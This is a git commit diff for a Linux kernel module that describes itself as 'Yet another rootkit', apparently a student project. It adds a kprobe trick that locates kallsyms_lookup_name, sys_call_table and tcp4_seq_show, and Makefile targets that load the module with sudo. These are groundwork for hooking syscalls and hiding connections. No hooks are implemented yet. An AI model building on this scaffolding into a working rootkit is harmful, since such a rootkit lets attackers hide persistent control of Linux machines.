df10f9ea7645c6b8c738f45874ee48f655fe799c
imlk <me@imlk.top>
2021-10-21 20:14:22 +0800

    feat: add search_function_with_kprobe

--- Makefile
+++ Makefile
@@ -6,4 +6,8 @@ all:
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 
+install: all
+	sudo insmod yark.ko
 
+uninstall:
+	sudo rmmod yark.ko
--- yark.c
+++ yark.c
@@ -1,4 +1,5 @@
 #include <linux/kernel.h>
+#include <linux/kprobes.h>
 #include <linux/module.h>
 
 MODULE_LICENSE("GPL");
@@ -6,16 +7,50 @@ MODULE_AUTHOR("Students from Institute of Information Engineering");
 MODULE_DESCRIPTION("Yet another rootkit.");
 MODULE_VERSION("0.01");
 
-static int __init yark_init(void) {
-    printk(KERN_INFO "Hello world 1.\n");
+#define MODULE_NAME "yark"
+#define LOG_PREFIX "yark: "
 
-    /*
-     * A non 0 return means init_module failed; module can't be loaded.
-     */
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+
+void *search_function_with_kprobe(const char *symbol_name) {
+    void *addr;
+    struct kprobe kp = {.symbol_name = symbol_name};
+    if (register_kprobe(&kp) < 0) {
+        return NULL;
+    }
+    addr = kp.addr;
+    unregister_kprobe(&kp);
+    return addr;
+}
+
+static int __init yark_init(void) {
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    unsigned long **sys_call_table;
+
+    pr_info(LOG_PREFIX "call yark_init()");
+
+    kallsyms_lookup_name = (kallsyms_lookup_name_t)search_function_with_kprobe(
+        "kallsyms_lookup_name");
+
+    pr_info(LOG_PREFIX "address of kallsyms_lookup_name: %px",
+            kallsyms_lookup_name);
+
+
+    void * tcp4_seq_show = (void*)search_function_with_kprobe(
+        "tcp4_seq_show");
+
+    pr_info(LOG_PREFIX "address of tcp4_seq_show: %px",
+            tcp4_seq_show);
+
+
+    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
+
+    pr_info(LOG_PREFIX "address of sys_call_table: %px", sys_call_table);
+
     return 0;
 }
 
-static void __exit yark_exit(void) { printk(KERN_INFO "Goodbye world 1.\n"); }
+static void __exit yark_exit(void) { pr_info(LOG_PREFIX "call yark_exit()"); }
 
 module_init(yark_init);
 module_exit(yark_exit);
